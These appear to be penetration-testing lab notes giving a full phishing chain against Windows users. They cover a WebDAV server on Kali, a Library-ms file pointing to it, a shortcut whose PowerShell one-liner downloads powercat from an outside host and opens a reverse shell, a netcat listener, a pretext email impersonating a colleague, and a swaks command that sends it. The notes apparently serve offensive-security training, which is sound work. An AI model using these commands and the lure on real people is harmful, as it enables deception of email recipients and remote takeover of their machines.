
`We will need to create these files on a Windows Machine.`

When we exhaust our attack surface and we have a means to - we can attempt to phish the users of interest in an attempt to gain access to another machine.

First on our local kali we will set up a WebDAV server:
```
mkdir /path/to/root/webdav/directory
```

```
wsgidav --host 0.0.0.0 --port=80 --auth=anonymous --root /path/to/root/webdav/directory
```

`path to webdav directory can be any directory we want - create one for the purpose`

on the windows machine:
```
right click "this PC"
click "add network location"
input our kali address as teh internet or netword address
```

Then we need to prepare our Windows Library and shortcut files.

config.Library-ms:
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>

<url>http:/<OUR_KALI_IP></url>

</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

then transfer this saved file to our kali machine using the WebDAV server we setup.
```
mv .\file \\kali_ip\DavWWWRoot\
```

create a shortcut link file:
```
right click desktop
create shortcut
for the location place a reverse shell script:

powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
```

and serve powercat with python webserver:
```
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .

python3 -m http.server 8000
```

then run a listener:
```
nc -nvlp 4444
```


create an email to send in a text file (body.txt):
```
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John
```

now we can use `swaks` to send an email using the discovered mail server:
```
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```

we will then need to enter the username and password of the account were sending it from.


